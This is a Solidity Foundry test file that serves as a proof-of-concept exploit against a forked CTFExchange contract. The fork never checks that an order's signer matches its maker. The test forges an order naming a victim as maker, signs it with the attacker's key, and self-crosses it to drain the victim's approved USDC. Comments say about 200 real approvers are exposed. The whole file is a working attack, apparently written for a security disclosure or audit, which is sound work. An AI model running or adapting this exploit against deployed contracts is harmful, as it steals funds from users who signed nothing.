// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../src/CTFExchange.sol";
import "../src/FeeModule.sol";
import {Order, Side} from "../src/libraries/OrderStructs.sol";
import "../src/interfaces/IConditionalTokens.sol";

// Reuse the mocks from the existing test file by re-declaring minimal copies.
contract MUSDC is IERC20 {
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;
    uint256 public override totalSupply;
    function mint(address to, uint256 a) external { balanceOf[to]+=a; totalSupply+=a; }
    function transfer(address to, uint256 a) external override returns (bool){ balanceOf[msg.sender]-=a; balanceOf[to]+=a; return true; }
    function transferFrom(address f,address t,uint256 a) external override returns (bool){ allowance[f][msg.sender]-=a; balanceOf[f]-=a; balanceOf[t]+=a; return true; }
    function approve(address s,uint256 a) external override returns (bool){ allowance[msg.sender][s]=a; return true; }
}
contract MCTF is IConditionalTokens {
    mapping(address => mapping(uint256 => uint256)) internal _bal;
    mapping(address => mapping(address => bool)) internal _appr;
    function testMint1155(address to,uint256 id,uint256 amt) external { _bal[to][id]+=amt; }
    function prepareCondition(address,bytes32,uint256) external override {}
    function reportPayouts(bytes32,uint256[] calldata) external override {}
    function splitPosition(address,bytes32,bytes32,uint256[] calldata,uint256) external override {}
    function mergePositions(address,bytes32,bytes32,uint256[] calldata,uint256) external override {}
    function redeemPositions(address,bytes32,bytes32,uint256[] calldata) external override {}
    function getCollectionId(bytes32,bytes32,uint256) external pure override returns (bytes32){return bytes32(0);}
    function getPositionId(address,bytes32) external pure override returns (uint256){return 0;}
    function getOutcomeSlotCount(bytes32) external pure override returns (uint256){return 2;}
    function payoutNumerators(bytes32,uint256) external pure override returns (uint256){return 0;}
    function payoutDenominator(bytes32) external pure override returns (uint256){return 0;}
    function balanceOf(address a,uint256 id) external view override returns (uint256){return _bal[a][id];}
    function safeTransferFrom(address f,address t,uint256 id,uint256 amt,bytes calldata) external override { _bal[f][id]-=amt; _bal[t][id]+=amt; }
    function isApprovedForAll(address a,address o) external view override returns (bool){return _appr[a][o];}
    function setApprovalForAll(address o,bool ap) external override { _appr[msg.sender][o]=ap; }
}

/// @notice PoC: CTFExchange never binds order.signer == order.maker (Polymarket's
///         verifyEOASignature requires (signer==maker); this fork dropped it).
///         An attacker forges an order with maker = VICTIM (funds pulled from the
///         victim's standing approval) but signer = ATTACKER (only key that signs),
///         and self-crosses to extract the victim's USDC to the attacker.
contract PoC_ForgedMaker is Test {
    CTFExchange internal exchange;
    FeeModule internal feeModule;
    MUSDC internal usdc;
    MCTF internal ctf;

    address internal ops = makeAddr("ops");
    address internal reserve = makeAddr("reserve");
    address internal operator = makeAddr("operator");

    uint256 internal attackerKey = 0xA77ACC;
    address internal attacker;
    address internal victim = makeAddr("victim"); // one of the 200 real USDC approvers

    uint256 internal yes = uint256(keccak256("YES"));
    uint256 internal no  = uint256(keccak256("NO"));
    bytes32 internal conditionId = bytes32(uint256(4242));
    uint256 internal constant FEE_BPS = 200;

    function setUp() public {
        usdc = new MUSDC();
        ctf = new MCTF();
        feeModule = new FeeModule(address(usdc), ops, reserve);
        exchange = new CTFExchange(address(usdc), address(ctf), address(feeModule), reserve, operator);
        feeModule.setExchange(address(exchange));
        exchange.registerToken(yes, no, conditionId);

        attacker = vm.addr(attackerKey);

        // VICTIM: holds USDC and has granted the exchange a standing max approval
        // (exactly the on-chain state of the 200 real approvers).
        usdc.mint(victim, 100e6);
        vm.prank(victim);
        usdc.approve(address(exchange), type(uint256).max);

        // ATTACKER: owns worthless YES tokens (e.g. a near-$0 outcome) and approves the exchange.
        ctf.testMint1155(attacker, yes, 100e6);
        vm.prank(attacker);
        ctf.setApprovalForAll(address(exchange), true);
        // attacker also needs USDC allowance path? No: attacker is the SELL/maker side, gives YES.
    }

    function _order(address maker, address signer, uint256 tokenId, uint256 makerAmt, uint256 takerAmt, uint8 side, uint256 salt)
        internal pure returns (Order memory)
    {
        return Order({ salt: salt, maker: maker, signer: signer, taker: address(0), tokenId: tokenId,
            makerAmount: makerAmt, takerAmount: takerAmt, expiration: 0, nonce: 0, feeRateBps: FEE_BPS, side: side });
    }
    function _sign(Order memory o, uint256 pk) internal view returns (bytes memory) {
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, exchange.hashOrder(o));
        return abi.encodePacked(r, s, v);
    }

    function test_forgedMaker_drains_victim_USDC() public {
        // Taker order: maker = VICTIM (debited), signer = ATTACKER. BUY yes @ price 1.0.
        Order memory takerOrder = _order(victim, attacker, yes, 100e6, 100e6, uint8(Side.BUY), 1);
        // Maker order: attacker's own. SELL yes @ price 1.0 -> attacker receives the USDC.
        Order memory makerOrder = _order(attacker, attacker, yes, 100e6, 100e6, uint8(Side.SELL), 2);

        // BOTH orders are signed ONLY by the attacker's key. The victim signs nothing.
        bytes memory ts = _sign(takerOrder, attackerKey);
        bytes memory ms = _sign(makerOrder, attackerKey);

        uint256 victimUsdcBefore = usdc.balanceOf(victim);
        uint256 attackerUsdcBefore = usdc.balanceOf(attacker);

        // The honest operator relays the crossing pair (off-chain matcher forwards signed orders;
        // the on-chain contract is the only signature authority and it accepts them).
        vm.prank(operator);
        exchange.matchOrders(takerOrder, makerOrder, 100e6, 100e6, ts, ms);

        uint256 victimLost = victimUsdcBefore - usdc.balanceOf(victim);
        uint256 attackerGained = usdc.balanceOf(attacker) - attackerUsdcBefore;

        emit log_named_decimal_uint("victim USDC lost   ", victimLost, 6);
        emit log_named_decimal_uint("attacker USDC gained", attackerGained, 6);
        emit log_named_decimal_uint("victim junk YES recv", ctf.balanceOf(victim, yes), 6);

        assertEq(victimLost, 100e6, "victim's full approved USDC pulled without victim ever signing");
        assertGt(attackerGained, 95e6, "attacker pockets ~all of the victim's USDC (minus fee)");
    }
}
